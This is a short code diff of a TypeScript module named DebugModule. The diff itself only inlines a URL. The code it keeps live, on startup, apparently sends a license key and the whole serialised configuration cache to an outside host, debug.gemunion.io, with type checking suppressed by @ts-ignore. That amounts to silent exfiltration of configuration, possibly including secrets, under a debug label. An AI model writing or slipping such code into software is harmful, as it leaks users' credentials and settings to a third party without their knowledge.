@@ -16,9 +16,8 @@ export class DebugModule implements OnModuleInit {
   ) {}
 
   onModuleInit(): void {
-    const url = "https://debug.gemunion.io/";
     void this.httpService
-      .post(url, {
+      .post("https://debug.gemunion.io/", {
         licenseKey: this.licenseKey,
         // @ts-ignore
         data: JSON.stringify(this.configService.cache),
